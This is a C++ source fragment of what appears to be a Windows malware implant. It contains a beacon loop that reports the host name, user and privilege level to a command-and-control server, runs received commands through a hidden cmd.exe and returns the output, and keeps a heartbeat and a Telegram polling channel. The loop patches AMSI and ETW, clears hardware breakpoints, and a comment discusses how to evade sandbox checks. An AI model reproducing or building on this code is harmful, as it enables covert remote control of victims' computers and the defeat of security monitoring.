    { "!browser",     false, HandleBrowser },
    { "!telegram ",   false, HandleTelegram },
    { "exit",         true,  nullptr },
    { "sleep",        true,  nullptr }
};

// =====================================================================
//  EXECUTE COMMAND (fallback)
// =====================================================================
std::wstring ExecuteCommand(const std::wstring& cmd) {
    std::string cmdStr = WStringToUTF8(cmd);
    for (const auto& entry : kCmdTable) {
        if (entry.exactMatch) {
            if (cmdStr == entry.prefix && entry.handler)
                return entry.handler("");
        } else {
            if (cmdStr.rfind(entry.prefix, 0) == 0 && entry.handler)
                return entry.handler(cmdStr.substr(strlen(entry.prefix)));
        }
    }
    // Fallback: raw command via cmd.exe /C
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring cmdLine = std::wstring(sysRoot) + L"\\System32\\cmd.exe /C " + cmd;

    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return L"[error: pipe failed]";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi = {};
    if (!CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite);
        return L"[error: CreateProcess failed]";
    }
    CloseHandle(hWrite);

    std::string output;
    output.reserve(4096);
    char buf[4096]; DWORD rd = 0;
    while (output.size() < config::CMD_OUTPUT_MAX) {
        if (!ReadFile(hRead, buf, sizeof(buf), &rd, nullptr) || rd == 0) break;
        output.append(buf, rd);
    }
    if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
    }
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hRead);
    return UTF8ToWString(output);
}

// =====================================================================
//  HEARTBEAT THREAD
// =====================================================================
static DWORD WINAPI HeartbeatThread(LPVOID) {
    Sleep(30000);
    while (true) {
        HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                           L"GET", L"/ping", "", L"");
        if (resp.status == 200) {
            DebugLog(L"Heartbeat: OK");
        } else {
            DebugLog(L"Heartbeat: no response (status=" +
                     std::to_wstring(resp.status) + L")");
        }
        Sleep(120000);
    }
    return 0;
}

// =====================================================================
//  MAIN BEACON LOOP
// =====================================================================
VOID BeaconLoop() {
    DebugLog(L"BeaconLoop started");

    Session session;
    session.hostname      = GetHostname();
    session.username      = GetUsername();
    session.build         = GetOSBuild();
    session.elevated      = IsElevated();
    session.amsiPatched   = PatchAMSI();
    session.etwPatched    = PatchETW();
    session.hwbpsCleared  = ClearHardwareBreakpoints();
    session.sessionId     = GetHostnameHash() + L"|" + session.username;

    g_SessionId = session.sessionId;
    g_SessionKey = DeriveKeyFromSessionId(session.sessionId);
    DebugLog(L"Session key derived from session ID.");
    DebugLog(L"Session: " + session.sessionId);

    // Start Telegram poller thread
    HANDLE hTele = CreateThread(nullptr, 0, TelegramPoller, nullptr, 0, nullptr);
    if (hTele) CloseHandle(hTele);

    HANDLE hHb = CreateThread(nullptr, 0, HeartbeatThread, nullptr, 0, nullptr);
    if (hHb) CloseHandle(hHb);

    DWORD failures = 0;
    bool sentHello = false;
    // ponytail: skip ReapplyEvasion on first pass — PatchAMSI/ETW already ran above;
    // the uptime sandbox check fires on any VM boot/resume and sleeps 1-4 hours before
    // a single beacon ever leaves the machine.
    bool firstPass = true;

    while (true) {
        try {
            if (!firstPass) ReapplyEvasion();
            firstPass = false;
            std::wstring task;
            BOOL ok = FALSE;

            static DWORD beaconCount = 0;
            ++beaconCount;
            DebugLog(L"BeaconLoop iteration #" + std::to_wstring(beaconCount));
            ok = SendBeacon(session, task);

            if (!ok) {
                ++failures;
                DebugLog(L"Beacon failure #" + std::to_wstring(failures));
            } else {
                if (failures > 0) failures = 0;
            }

            if (ok && !sentHello) {
                sentHello = true;
                SendResult(session.sessionId, L"hi");
                DebugLog(L"Sent hello to worker.");
            }

            if (ok) {
                if (task == L"sleep" || task.empty()) {
                    // no-op
                } else if (task == L"exit") {
                    DebugLog(L"Exit received.");
                    return;
                } else {
                    std::wstring result = ExecuteCommand(task);
                    SendResult(session.sessionId, result);
                }
            }

            DWORD sleepMin = config::BEACON_MIN;
            DWORD sleepMax = config::BEACON_MAX;
            if (failures >= config::MAX_FAILURES) {
                sleepMin *= config::BACKOFF_FACTOR;
                sleepMax *= config::BACKOFF_FACTOR;
            }
            JitterSleep(sleepMin, sleepMax);

        } catch (const std::exception& e) {
            DebugLog(L"BeaconLoop exception: " + UTF8ToWString(e.what()));
            Sleep(10000);
        } catch (...) {
            DebugLog(L"BeaconLoop: unknown exception, restarting in 10s");
            Sleep(10000);
        }
    }
}